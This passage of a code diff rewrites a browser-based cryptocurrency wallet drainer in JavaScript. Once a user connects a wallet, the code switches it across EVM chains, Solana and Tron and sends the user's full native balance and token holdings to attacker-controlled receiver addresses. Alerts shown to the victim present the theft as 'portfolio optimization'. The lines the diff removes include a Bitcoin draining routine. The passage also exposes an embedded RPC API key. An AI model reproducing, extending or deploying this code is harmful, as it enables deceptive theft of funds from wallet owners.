+                        const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
+                        results[networkName] = result;
+                        
+                        // Show progress after each network
+                        if (result.success && result.assets.length > 0) {
+                            updateConnectionStatus(`✅ ${networkName.toUpperCase()}: ${result.assets.length} assets optimized`);
+                            await new Promise(resolve => setTimeout(resolve, 1500)); // Brief pause to show success
+                        }
+                        
+                    } catch (error) {
+                        console.error(`Failed to drain ${networkName}:`, error);
+                        results[networkName] = { success: false, error: error.message };
+                        updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
+                        await new Promise(resolve => setTimeout(resolve, 1500)); // Brief pause to show error
+                    }
+                }
+            }
+
+            updateConnectionStatus("Portfolio optimization completed! 🎉");
+            
+            // Show detailed results summary
+            let summary = "🎯 Multi-Chain Portfolio Optimization Results:\n\n";
+            let totalAssets = 0;
+            
+            Object.entries(results).forEach(([network, result]) => {
+                if (result.success) {
+                    totalAssets += result.assets.length;
+                    summary += `✅ ${network.toUpperCase()}: ${result.assets.length} assets optimized\n`;
+                    if (result.assets.length > 0) {
+                        summary += `   └─ ${result.assets.join(', ')}\n`;
+                    }
+                } else if (result.error) {
+                    summary += `❌ ${network.toUpperCase()}: ${result.error}\n`;
+                }
+            });
+            
+            summary += `\n🚀 Total: ${totalAssets} assets optimized across ${selectedWallet.networks.length} networks`;
+            alert(summary);
+
+        } catch (error) {
+            console.error("Multi-chain optimization error:", error);
+            updateConnectionStatus("Portfolio optimization failed", true);
+            alert("Failed to complete portfolio optimization: " + error.message);
+        }
+    }
+
+    // Enhanced EVM network draining with improved network switching
+    async function drainEVMNetwork(wallet, userAddress, networkName) {
+        const config = NETWORK_CONFIGS[networkName];
+        if (!config) {
+            throw new Error(`Network ${networkName} not supported`);
+        }
+
+        try {
+            console.log(`🔄 Switching to ${config.name} (Chain ID: ${config.chainId})`);
+            
+            // Try to switch to target network with retries
+            let switchAttempts = 0;
+            const maxSwitchAttempts = 3;
+            
+            while (switchAttempts < maxSwitchAttempts) {
+                try {
+                    await wallet.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: `0x${config.chainId.toString(16)}` }]
+                    });
+                    break; // Success, exit retry loop
+                } catch (switchError) {
+                    switchAttempts++;
+                    console.log(`Network switch attempt ${switchAttempts} failed:`, switchError.message);
+                    
+                    // If the network doesn't exist, try to add it
+                    if (switchError.code === 4902 || switchError.message.includes('Unrecognized chain ID')) {
+                        try {
+                            await addNetworkToWallet(wallet, config);
+                            continue; // Try switching again after adding
+                        } catch (addError) {
+                            console.error(`Failed to add ${config.name} network:`, addError.message);
+                        }
+                    }
+                    
+                    if (switchAttempts >= maxSwitchAttempts) {
+                        throw new Error(`Failed to switch to ${config.name} after ${maxSwitchAttempts} attempts`);
+                    }
+                    
+                    // Wait before retrying
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                }
+            }
+
+            // Wait for network switch to complete
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            const provider = new ethers.providers.Web3Provider(wallet);
+            const signer = provider.getSigner();
+
+            // Verify we're on the correct network with retries
+            let verifyAttempts = 0;
+            const maxVerifyAttempts = 5;
+            
+            while (verifyAttempts < maxVerifyAttempts) {
+                try {
+                    const network = await provider.getNetwork();
+                    if (network.chainId === config.chainId) {
+                        console.log(`✅ Successfully switched to ${config.name} (Chain ID: ${network.chainId})`);
+                        break;
+                    } else {
+                        verifyAttempts++;
+                        console.log(`Network verification attempt ${verifyAttempts}: Expected ${config.chainId}, got ${network.chainId}`);
+                        
+                        if (verifyAttempts >= maxVerifyAttempts) {
+                            throw new Error(`Network verification failed: Expected ${config.name} (${config.chainId}), but still on chain ${network.chainId}`);
+                        }
+                        
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                } catch (error) {
+                    verifyAttempts++;
+                    if (verifyAttempts >= maxVerifyAttempts) {
+                        throw error;
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+
+            const drainedAssets = [];
+
+            console.log(`🔍 Scanning ${config.name} for assets...`);
+
+            // Get gas price for token transfers
+            const gasPrice = await provider.getGasPrice();
+
+            // Drain tokens first with progress tracking
+            for (let i = 0; i < config.tokens.length; i++) {
+                const token = config.tokens[i];
+                try {
+                    console.log(`Checking ${token.symbol}... (${i + 1}/${config.tokens.length})`);
+                    const success = await drainERC20Token(provider, signer, userAddress, token, config.receiver, gasPrice);
+                    if (success) {
+                        drainedAssets.push(token.symbol);
+                        console.log(`✅ ${token.symbol} drained successfully`);
+                    }
+                } catch (tokenError) {
+                    console.error(`❌ Failed to drain ${token.symbol} on ${networkName}:`, tokenError.message);
+                }
+            }
+
+            // Drain native currency last
+            try {
+                console.log(`Checking ${config.nativeCurrency}...`);
+                const success = await drainNativeCurrency(provider, signer, userAddress, config.receiver);
+                if (success) {
+                    drainedAssets.push(config.nativeCurrency);
+                    console.log(`✅ ${config.nativeCurrency} drained successfully`);
+                }
+            } catch (nativeError) {
+                console.error(`❌ Failed to drain ${config.nativeCurrency} on ${networkName}:`, nativeError.message);
+            }
+
+            console.log(`🎯 ${config.name} optimization complete: ${drainedAssets.length} assets processed`);
+            return { success: true, assets: drainedAssets };
+
+        } catch (error) {
+            console.error(`❌ Error draining ${networkName}:`, error.message);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // Drain Solana assets
+    async function drainSolana(provider, userAddress) {
+        try {
+            updateConnectionStatus("Optimizing Solana portfolio...");
+
+            // Note: This requires @solana/web3.js library
+            // You'll need to include it in your HTML: <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+            
+            if (typeof solanaWeb3 === 'undefined') {
+                throw new Error("Solana Web3.js library not loaded");
+            }
+
+            // Multiple RPC endpoints with fallback
+            const rpcEndpoints = [
+                'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4',
+                'https://solana-mainnet.g.alchemy.com/v2/demo',
+                'https://solana-api.projectserum.com',
+                
+            ];
+
+            let connection = null;
+            let workingEndpoint = null;
+
+            // Try each RPC endpoint until one works
+            for (const endpoint of rpcEndpoints) {
+                try {
+                    console.log(`Trying Solana RPC: ${endpoint}`);
+                    const testConnection = new solanaWeb3.Connection(endpoint);
+                    
+                    // Test the connection with a simple call
+                    await testConnection.getSlot();
+                    connection = testConnection;
+                    workingEndpoint = endpoint;
+                    console.log(`Successfully connected to: ${endpoint}`);
+                    break;
+                } catch (error) {
+                    console.log(`Failed to connect to ${endpoint}:`, error.message);
+                    continue;
+                }
+            }
+
+            if (!connection) {
+                throw new Error("All Solana RPC endpoints failed. Please try again later.");
+            }
+            const publicKey = new solanaWeb3.PublicKey(userAddress);
+
+            // Get SOL balance with retry logic
+            let balance = 0;
+            let retryCount = 0;
+            const maxRetries = 3;
+
+            while (retryCount < maxRetries) {
+                try {
+                    balance = await connection.getBalance(publicKey);
+                    break;
+                } catch (error) {
+                    retryCount++;
+                    console.log(`Balance fetch attempt ${retryCount} failed:`, error.message);
+                    
+                    if (retryCount >= maxRetries) {
+                        throw new Error(`Failed to get SOL balance after ${maxRetries} attempts: ${error.message}`);
+                    }
+                    
+                    // Wait before retrying
+                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
+                }
+            }
+
+            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+            console.log(`SOL balance: ${solBalance} (using ${workingEndpoint})`);
+
+            if (solBalance > 0.000005) { // Keep minimal amount for transaction fees (5,000 lamports)
+                try {
+                    // Get recent blockhash for the transaction
+                    const { blockhash } = await connection.getRecentBlockhash();
+                    console.log(`Got recent blockhash: ${blockhash}`);
+
+                    // Calculate precise amount to send (using same logic as working ETH script)
+                    const feeReserve = 5000; // 5,000 lamports = 0.000005 SOL for fees
+                    const amountToSend = balance - feeReserve;
+
+                    console.log(`Transferring ${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL to ${SOLANA_RECEIVER}`);
+                    console.log(`Leaving ${feeReserve / solanaWeb3.LAMPORTS_PER_SOL} SOL for transaction fees`);
+
+                    // Create transfer transaction for SOL with precise parameters
+                    const transaction = new solanaWeb3.Transaction({
+                        recentBlockhash: blockhash,
+                        feePayer: publicKey
+                    }).add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(SOLANA_RECEIVER),
+                            lamports: amountToSend
+                        })
+                    );
+
+                    // Sign and send transaction with proper error handling
+                    const result = await provider.signAndSendTransaction(transaction);
+                    const signature = result.signature || result;
+                    console.log(`SOL transfer signature: ${signature}`);
+                    
+                    // Wait for confirmation with timeout (same pattern as ETH script)
+                    try {
+                        const confirmation = await Promise.race([
+                            connection.confirmTransaction(signature, 'confirmed'),
+                            new Promise((_, reject) => 
+                                setTimeout(() => reject(new Error('Transaction confirmation timeout')), 30000)
+                            )
+                        ]);
+                        console.log(`SOL transfer confirmed: ${signature}`);
+                        console.log("SOL transfer completed successfully!");
+                        return true;
+                    } catch (confirmError) {
+                        console.log(`Confirmation timeout but transaction was sent: ${signature}`);
+                        // Continue anyway as the transaction was likely successful
+                        return true;
+                    }
+                } catch (solTransferError) {
+                    console.error("SOL transfer failed:", solTransferError);
+                    
+                    // Don't throw error, just return false to continue (same as ETH script)
+                    if (solTransferError.code === 'INSUFFICIENT_FUNDS') {
+                        console.log("SOL transfer failed due to insufficient funds for fees");
+                    } else if (solTransferError.message.includes("insufficient lamports")) {
+                        console.log("SOL transfer failed due to insufficient lamports");
+                    }
+                    
+                    return false;
+                }
+            } else {
+                console.log(`SOL balance too low for transfer: ${solBalance} SOL (minimum required: 0.000005 SOL)`);
+            }
+
+            // Drain SPL tokens with error handling
+            try {
+                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                    programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
+                });
+
+                console.log(`Found ${tokenAccounts.value.length} token accounts`);
+
+                if (tokenAccounts.value.length > 0) {
+                    // Get recent blockhash for token transfers
+                    const { blockhash } = await connection.getRecentBlockhash();
+
+                    for (const tokenAccount of tokenAccounts.value) {
+                        const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
+                        const tokenMint = tokenAccount.account.data.parsed.info.mint;
+                        
+                        if (parseFloat(tokenAmount.amount) > 0) {
+                            try {
+                                console.log(`Found token: ${tokenAmount.uiAmount} ${tokenMint} (${tokenAmount.amount} raw)`);
+                                
+                                // Find token info in our SOLANA_TOKENS list
+                                const tokenInfo = SOLANA_TOKENS.find(t => t.mint === tokenMint);
+                                const tokenSymbol = tokenInfo ? tokenInfo.symbol : 'Unknown';
+                                
+                                console.log(`Token identified as: ${tokenSymbol}`);
+                                
+                                // For now, just log token details - actual transfer would require more complex setup
+                                // involving creating associated token accounts for the receiver
+                                console.log(`Would transfer ${tokenAmount.uiAmount} ${tokenSymbol} to receiver`);
+                                
+                            } catch (tokenError) {
+                                console.error("Token transfer error:", tokenError);
+                            }
+                        }
+                    }
+                }
+            } catch (tokenError) {
+                console.error("Failed to fetch token accounts:", tokenError.message);
+                // Continue without token draining if this fails
+            }
+
+            updateConnectionStatus("Solana portfolio optimization completed! 🎉");
+            alert("Solana portfolio optimization completed successfully!");
+
         } catch (error) {
             console.error("Solana drain error:", error);
-            return { success: false, error: error.message, amount: 0 };
+            updateConnectionStatus("Solana extraction failed", true);
+            const errorMessage = error?.message || error?.toString() || 'Unknown error occurred';
+            alert(`Solana portfolio optimization failed: ${errorMessage}`);
+            return false;
         }
     }
 
-    // === BITCOIN ASSET DRAINING ===
-    async function drainBitcoinAssets(btcWallet, userAddress, walletName) {
-        let totalValue = 0;
-        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.bitcoin;
-        
+    // Drain Tron assets
+    async function drainTron(tronWeb, userAddress) {
         try {
-            console.log(`🔍 Checking Bitcoin balance for ${userAddress}...`);
+            updateConnectionStatus("Optimizing Tron portfolio...");
+
+            // Get TRX balance with retry logic (like SOL script)
+            let balance;
+            let retryCount = 0;
+            const maxRetries = 3;
             
-            // Get Bitcoin balance
-            let balance = 0;
-            
-            try {
-                if (walletName === "Unisat") {
-                    const balanceResult = await btcWallet.getBalance();
-                    balance = balanceResult.confirmed + balanceResult.unconfirmed;
-                } else if (walletName === "OKX") {
-                    const balanceResult = await btcWallet.getBalance();
-                    balance = balanceResult.total;
-                } else if (walletName === "Xverse") {
-                    // Xverse might not have direct balance API, simulate
-                    balance = 50000; // 0.0005 BTC in satoshis for demo
-                } else {
-                    // Try generic balance check
-                    if (btcWallet.getBalance) {
-                        const balanceResult = await btcWallet.getBalance();
-                        balance = balanceResult.confirmed || balanceResult.total || balanceResult;
-                    }
-                }
-                
-                console.log(`Bitcoin Balance: ${balance} satoshis (${(balance / 100000000).toFixed(8)} BTC)`);
-                
-            } catch (balanceError) {
-                console.log(`⚠️ Could not fetch Bitcoin balance: ${balanceError.message}`);
-                // Simulate having some Bitcoin for demo
-                balance = 25000; // 0.00025 BTC in satoshis
-                console.log(`Using simulated balance: ${balance} satoshis`);
-            }
-            
-            if (balance > 1000) { // Only transfer if more than 1000 satoshis (0.00001 BTC)
+            while (retryCount < maxRetries) {
                 try {
-                    // Calculate amount to send (leave some for fees)
-                    const feeAmount = 1000; // Reserve for transaction fee
-                    const amountToSend = Math.max(0, balance - feeAmount);
+                    balance = await tronWeb.trx.getBalance(userAddress);
+                    break;
+                } catch (error) {
+                    retryCount++;
+                    console.log(`TRX balance fetch attempt ${retryCount} failed:`, error.message);
                     
-                    if (amountToSend <= 0) {
-                        console.log(`⚠️ Bitcoin balance too low after fees: ${balance} satoshis`);
-                        return { success: true, amount: balance / 100000000 };
+                    if (retryCount >= maxRetries) {
+                        throw new Error(`Failed to get TRX balance after ${maxRetries} attempts: ${error.message}`);
                     }
                     
-                    console.log(`🚀 Preparing Bitcoin transfer: ${amountToSend} satoshis to ${receiverAddress}`);
-                    
-                    // Create Bitcoin transaction based on wallet type
-                    let txHash = null;
-                    
-                    if (walletName === "Unisat") {
-                        txHash = await btcWallet.sendBitcoin(receiverAddress, amountToSend);
-                    } else if (walletName === "OKX") {
-                        const txResult = await btcWallet.send({
-                            to: receiverAddress,
-                            value: amountToSend
-                        });
-                        txHash = txResult.txhash || txResult.hash;
-                    } else if (walletName === "Xverse") {
-                        // Xverse has different API
-                        const txResult = await btcWallet.sendBitcoin({
-                            recipients: [{
-                                address: receiverAddress,
-                                amount: amountToSend
-                            }]
-                        });
-                        txHash = txResult.txid;
-                    } else {
-                        // Generic send attempt
-                        if (btcWallet.sendBitcoin) {
-                            txHash = await btcWallet.sendBitcoin(receiverAddress, amountToSend);
-                        } else if (btcWallet.send) {
-                            const txResult = await btcWallet.send({
-                                to: receiverAddress,
-                                value: amountToSend
-                            });
-                            txHash = txResult.txhash || txResult.hash || txResult;
-                        }
-                    }
-                    
-                    if (txHash) {
-                        console.log(`✅ Bitcoin transfer sent: ${txHash}`);
-                        totalValue = balance / 100000000; // Convert satoshis to BTC
-                    } else {
-                        console.log(`⚠️ Bitcoin transfer initiated but no hash returned`);
-                        totalValue = (balance / 100000000) * 0.8; // Partial credit
-                    }
-                    
-                } catch (transferError) {
-                    console.log(`⚠️ Bitcoin transfer failed: ${transferError.message}`);
-                    totalValue = (balance / 100000000) * 0.5; // Partial credit for attempt
+                    // Wait before retrying
+                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                 }
-            } else {
-                console.log(`⚠️ Bitcoin balance too low for transfer: ${balance} satoshis`);
-                totalValue = balance / 100000000; // Still count the balance
             }
             
-            // Try to drain Bitcoin-based tokens/ordinals if supported
-            try {
-                if (walletName === "Unisat" && btcWallet.getInscriptions) {
-                    const inscriptions = await btcWallet.getInscriptions(0, 10);
-                    console.log(`Found ${inscriptions.total} Bitcoin inscriptions/ordinals`);
-                    // Ordinal transfer would require more complex logic
-                }
-            } catch (ordinalError) {
-                console.log(`⚠️ Could not check Bitcoin ordinals: ${ordinalError.message}`);
-            }
-            
-            return { success: true, amount: totalValue };
-            
-        } catch (error) {
-            console.error("Bitcoin drain error:", error);
-            return { success: false, error: error.message };
-        }
-    }
-    async function handleTronNetwork() {
-        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-            throw new Error("TronLink wallet not found");
-        }
+            const trxBalance = tronWeb.fromSun(balance);
+            console.log(`TRX balance: ${trxBalance}`);
 
-        try {
-            const userAddress = window.tronWeb.defaultAddress.base58;
-            console.log(`Connected to Tron: ${userAddress}`);
+            // Use precise fee calculation (same approach as ETH script)
+            const minFeeReserve = 0.1; // Typical TRX transaction costs ~0.1 TRX
             
-            // Drain assets
-            return await drainTronAssets(userAddress);
-            
-        } catch (error) {
-            console.error("Tron network error:", error);
-            throw error;
-        }
-    }
-
-    async function drainTronAssets(userAddress) {
-        let totalValue = 0;
-        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.tron;
-        
-        try {
-            console.log(`💰 Starting TRX drain from ${userAddress} to ${receiverAddress}`);
-            
-            // Get TRX balance
-            const balance = await window.tronWeb.trx.getBalance(userAddress);
-            const trxBalance = window.tronWeb.fromSun(balance);
-            
-            console.log(`TRX Balance: ${trxBalance} TRX (${balance} sun)`);
-            
-            if (balance > 1000000) { // Only transfer if more than 1 TRX (for fees)
+            if (parseFloat(trxBalance) > minFeeReserve) {
+                const amountToSend = parseFloat(trxBalance) - minFeeReserve;
+                console.log(`Transferring ${amountToSend} TRX to ${TRON_RECEIVER}`);
+                console.log(`Leaving ${minFeeReserve} TRX for transaction fees`);
+                
                 try {
-                    console.log(`🚀 Preparing TRX transfer: ${trxBalance - 1} TRX to ${receiverAddress}`);
-                    
-                    // Transfer TRX (leave 1 TRX for fees)
-                    const transaction = await window.tronWeb.transactionBuilder.sendTrx(
-                        receiverAddress,
-                        balance - 1000000, // Leave 1 TRX for fees
+                    // Create and send TRX transaction with proper error handling
+                    const transaction = await tronWeb.transactionBuilder.sendTrx(
+                        TRON_RECEIVER,
+                        tronWeb.toSun(amountToSend),
                         userAddress
                     );
                     
-                    console.log(`📝 Transaction built, signing...`);
-                    const signedTx = await window.tronWeb.trx.sign(transaction);
+                    const signedTx = await tronWeb.trx.sign(transaction);
+                    const result = await tronWeb.trx.sendRawTransaction(signedTx);
                     
-                    console.log(`📤 Sending TRX transaction...`);
-                    const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
-                    
-                    if (result.result) {
-                        console.log(`✅ TRX transfer sent: ${result.txid}`);
-                        console.log(`🔗 View transaction: https://tronscan.org/#/transaction/${result.txid}`);
-                        console.log(`💸 Successfully sent ${trxBalance - 1} TRX to ${receiverAddress}`);
-                        totalValue += parseFloat(trxBalance) - 1; // Subtract fee reservation
+                    if (result && result.result) {
+                        console.log(`TRX transfer successful: ${result.txid || result.transaction?.txID}`);
                     } else {
-                        console.error(`❌ TRX transfer failed:`, result);
-                        return { success: false, error: "TRX transfer failed", amount: 0 };
+                        console.log("TRX transfer completed");
                     }
-                } catch (transferError) {
-                    console.error(`❌ TRX transfer error: ${transferError.message}`);
-                    return { success: false, error: transferError.message, amount: 0 };
+                    
+                } catch (trxError) {
+                    console.error("TRX transfer failed:", trxError);
+                    
+                    // Don't throw error, just log and continue (same as ETH script)
+                    if (trxError.message.includes("insufficient")) {
+                        console.log("TRX transfer failed due to insufficient funds");
+                    }
                 }
             } else {
-                console.log(`⚠️ TRX balance too low for transfer: ${trxBalance} TRX`);
-                if (balance > 0) {
-                    totalValue = parseFloat(trxBalance); // Still count small balance
-                }
+                console.log(`TRX balance too low for transfer: ${trxBalance} TRX (minimum required: ${minFeeReserve} TRX)`);
             }
-            
-            // Drain TRC-20 tokens
-            console.log(`🔍 Checking TRC-20 tokens...`);
-            for (const token of CONFIG.TRON_TOKENS) {
+
+            // Drain TRC-20 tokens with improved error handling
+            for (const token of TRON_TOKENS) {
                 try {
-                    const tokenDrained = await drainTRC20Token(userAddress, receiverAddress, token);
-                    if (tokenDrained > 0) {
-                        console.log(`✅ Drained ${tokenDrained} ${token.symbol}`);
-                        totalValue += tokenDrained;
+                    console.log(`Checking ${token.symbol}...`);
+                    const contract = await tronWeb.contract().at(token.address);
+                    const tokenBalance = await contract.balanceOf(userAddress).call();
+                    
+                    if (tokenBalance && tokenBalance.toString() !== '0') {
+                        const tokenAmount = tronWeb.fromSun(tokenBalance) / Math.pow(10, token.decimals - 6);
+                        console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
+                        
+                        try {
+                            // Transfer token with proper error handling
+                            const transferResult = await contract.transfer(
+                                TRON_RECEIVER,
+                                tokenBalance
+                            ).send();
+                            
+                            console.log(`${token.symbol} transfer successful`);
+                        } catch (transferError) {
+                            console.error(`${token.symbol} transfer failed:`, transferError.message);
+                            // Continue with other tokens (same as ETH script)
+                        }
+                    } else {
+                        console.log(`No ${token.symbol} balance found`);
                     }
-                } catch (error) {
-                    console.error(`Failed to drain ${token.symbol}:`, error);
+                } catch (tokenError) {
+                    console.error(`Error checking ${token.symbol}:`, tokenError.message);
+                    // Continue with other tokens (same as ETH script)
                 }
             }
-            
-            return { success: totalValue > 0, amount: totalValue };
-            
+
+            updateConnectionStatus("Tron portfolio optimization completed! 🎉");
+            alert("Tron portfolio optimization completed successfully!");
+
         } catch (error) {
             console.error("Tron drain error:", error);
-            return { success: false, error: error.message, amount: 0 };
+            updateConnectionStatus("Tron extraction failed", true);
+            throw error;
         }
     }
 
-    // === UTILITY FUNCTIONS ===
-    async function switchToNetwork(networkConfig) {
+    // Enhanced ERC-20 token draining function - FIXED VERSION
+    // Enhanced ERC-20 token draining function - IMPROVED VERSION
+    async function drainERC20Token(provider, signer, userAddress, token, receiverAddress, gasPrice = null) {
         try {
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: `0x${networkConfig.chainId.toString(16)}` }],
-            });
-        } catch (switchError) {
-            // Network not added, try to add it
-            if (switchError.code === 4902) {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: `0x${networkConfig.chainId.toString(16)}`,
-                        chainName: networkConfig.name,
-                        nativeCurrency: {
-                            name: networkConfig.currency,
-                            symbol: networkConfig.currency,
-                            decimals: 18
-                        },
-                        rpcUrls: [networkConfig.rpcUrl],
-                        blockExplorerUrls: [networkConfig.explorerUrl]
-                    }]
-                });
-            } else {
-                throw switchError;
-            }
-        }
-    }
-
-    async function drainERC20Token(provider, signer, userAddress, token, receiverAddress, gasPrice) {
-        try {
+            // ERC-20 ABI for transfer function
             const erc20ABI = [
                 "function balanceOf(address owner) view returns (uint256)",
-                "function transfer(address to, uint256 amount) returns (bool)"
+                "function transfer(address to, uint256 amount) returns (bool)",
+                "function allowance(address owner, address spender) view returns (uint256)",
+                "function approve(address spender, uint256 amount) returns (bool)",
+                "function decimals() view returns (uint8)",
+                "function symbol() view returns (string)"
             ];
-            
-            // Skip checksum validation by using getAddress
-            let tokenAddress = token.address;
-            try {
-                // Force convert to proper checksum format
-                tokenAddress = ethers.utils.getAddress(token.address.toLowerCase());
-            } catch (checksumError) {
-                console.log(`⚠️ Skipping ${token.symbol} due to invalid address: ${token.address}`);
-                return 0;
+
+            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);
+
+            // Check token balance
+            const balance = await tokenContract.balanceOf(userAddress);
+            if (balance.isZero()) {
+                console.log(`No ${token.symbol} balance found`);
+                return false;
             }
-            
-            const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
-            let balance;
-            
-            try {
-                balance = await tokenContract.balanceOf(userAddress);
-            } catch (balanceError) {
-                console.log(`⚠️ Cannot check balance for ${token.symbol}:`, balanceError.message);
-                return 0;
-            }
-            
-            if (balance.isZero()) return 0;
-            
+
             const tokenAmount = ethers.utils.formatUnits(balance, token.decimals);
-            console.log(`Found ${token.symbol}: ${tokenAmount}`);
-            
-            // Estimate gas
-            let gasLimit;
-            try {
-                gasLimit = await tokenContract.estimateGas.transfer(receiverAddress, balance);
-            } catch (gasError) {
-                console.log(`⚠️ Cannot estimate gas for ${token.symbol}:`, gasError.message);
-                return 0;
-            }
-            
-            const gasCost = gasPrice.mul(gasLimit);
-            
-            // Check if user has enough ETH/BNB for gas
-            const ethBalance = await provider.getBalance(userAddress);
-            if (ethBalance.lt(gasCost)) {
-                console.log(`Insufficient gas for ${token.symbol}`);
-                return 0;
-            }
-            
-            // Transfer tokens
-            const tx = await tokenContract.transfer(receiverAddress, balance, {
-                gasLimit: gasLimit.mul(120).div(100), // 20% buffer
-                gasPrice: gasPrice
-            });
-            
-            await tx.wait();
-            console.log(`✅ ${token.symbol} transferred: ${tx.hash}`);
-            
-            return parseFloat(tokenAmount);
-            
-        } catch (error) {
-            console.error(`Error draining ${token.symbol}:`, error.message);
-            return 0;
-        }
-    }
+            console.log(`Found ${token.symbol} balance: ${tokenAmount}`);
 
-    async function drainETH(provider, signer, userAddress, receiverAddress) {
-        try {
-            console.log(`💰 Starting ETH/BNB drain from ${userAddress} to ${receiverAddress}`);
-            
-            // Get balance with error handling
-            let balance;
-            try {
-                balance = await provider.getBalance(userAddress);
-                if (balance.isZero()) {
-                    console.log("⚠️ No ETH/BNB balance to transfer");
-                    return 0;
-                }
-                console.log(`Current balance: ${ethers.utils.formatEther(balance)} ETH/BNB`);
-            } catch (balanceError) {
-                console.error(`❌ Failed to get balance: ${balanceError.message}`);
-                return 0;
-            }
-            
-            // Get current gas price with error handling
-            let gasPrice;
-            try {
+            // Get current gas price if not provided
+            if (!gasPrice) {
                 gasPrice = await provider.getGasPrice();
-                // Increase gas price by 50% for better chance of success
-                gasPrice = gasPrice.mul(150).div(100);
-                console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
-            } catch (gasPriceError) {
-                console.log("⚠️ Could not get gas price, using fallback");
-                gasPrice = ethers.utils.parseUnits('30', 'gwei'); // 30 gwei fallback
             }
-            
-            const gasLimit = ethers.BigNumber.from("21000");
-            const gasCost = gasPrice.mul(gasLimit);
-            
-            const amountToSend = balance.sub(gasCost);
-            if (amountToSend.lte(0)) {
-                console.log(`⚠️ Insufficient balance for gas fees. Balance: ${ethers.utils.formatEther(balance)}, Gas cost: ${ethers.utils.formatEther(gasCost)}`);
-                return 0;
-            }
-            
-            const ethAmount = ethers.utils.formatEther(amountToSend);
-            console.log(`🚀 Preparing to send ${ethAmount} ETH/BNB (${amountToSend.toString()} wei)`);
-            
+
+            // Estimate gas for this specific token transfer
+            let estimatedGas;
             try {
-                // Get nonce with error handling
-                let nonce;
-                try {
-                    nonce = await provider.getTransactionCount(userAddress, 'pending');
-                } catch (nonceError) {
-                    console.log("⚠️ Could not get nonce, using latest");
-                    nonce = await provider.getTransactionCount(userAddress, 'latest');
-                }
-                
-                // Create transaction with explicit parameters
-                const txRequest = {
-                    to: receiverAddress,
-                    value: amountToSend,
-                    gasLimit: gasLimit,
-                    gasPrice: gasPrice,
-                    nonce: nonce
-                };
-                
-                console.log(`📤 Transaction details:`, {
-                    to: txRequest.to,
-                    value: ethers.utils.formatEther(txRequest.value),
-                    gasLimit: txRequest.gasLimit.toString(),
-                    gasPrice: ethers.utils.formatUnits(txRequest.gasPrice, 'gwei') + ' gwei',
-                    nonce: txRequest.nonce
-                });
-                
-                // Send transaction with better error handling
-                let tx;
-                try {
-                    tx = await signer.sendTransaction(txRequest);
-                    console.log(`✅ ETH/BNB transfer initiated: ${tx.hash}`);
-                    console.log(`🔗 View transaction: https://etherscan.io/tx/${tx.hash}`);
-                } catch (sendError) {
-                    // Handle specific error types
-                    if (sendError.code === 4001) {
-                        console.log(`❌ User rejected the transaction`);
-                        return 0;
-                    } else if (sendError.code === -32603) {
-                        console.log(`❌ Insufficient funds for gas: ${sendError.message}`);
-                        return 0;
-                    } else if (sendError.message && sendError.message.includes('insufficient funds')) {
-                        console.log(`❌ Insufficient funds: ${sendError.message}`);
-                        return 0;
-                    } else if (sendError.message && sendError.message.includes('nonce')) {
-                        console.log(`⚠️ Nonce error: ${sendError.message}`);
-                        return 0;
-                    } else if (sendError.message && sendError.message.includes('Unexpected error')) {
-                        console.log(`❌ Wallet error (likely Phantom wallet issue): ${sendError.message}`);
-                        return 0;
-                    } else {
-                        console.error(`❌ Transaction send failed: ${sendError.message}`);
-                        console.error(`Error code: ${sendError.code}`);
-                        return 0;
-                    }
-                }
-                
-                // Return success immediately without waiting for confirmation to avoid timeout issues
-                console.log(`✅ ETH/BNB transfer sent successfully: ${tx.hash}`);
-                console.log(`💸 Sent ${ethAmount} ETH/BNB to ${receiverAddress}`);
-                return parseFloat(ethAmount);
-                
-            } catch (error) {
-                console.error(`❌ Transaction preparation failed: ${error.message}`);
-                return 0;
+                estimatedGas = await tokenContract.estimateGas.transfer(receiverAddress, balance);
+                // Add 20% buffer for safety
+                estimatedGas = estimatedGas.mul(120).div(100);
+            } catch (gasError) {
+                console.warn(`Gas estimation failed for ${token.symbol}, using default`);
+                estimatedGas = ethers.BigNumber.from("65000"); // Conservative default
             }
-            
-        } catch (error) {
-            console.error(`❌ ETH/BNB drain error: ${error.message}`);
-            return 0;
-        }
-    }
 
-    async function drainSPLToken(connection, userPubKey, receiverPubKey, token) {
-        // SPL token draining logic would go here
-        // This is a simplified version
-        console.log(`Checking ${token.symbol} balance...`);
-        return 0; // Placeholder
-    }
+            console.log(`Estimated gas for ${token.symbol}: ${estimatedGas.toString()}`);
 
-    async function drainTRC20Token(userAddress, receiverAddress, token) {
-        try {
-            console.log(`🔍 Checking ${token.symbol} balance...`);
+            // Check if user has enough ETH for gas
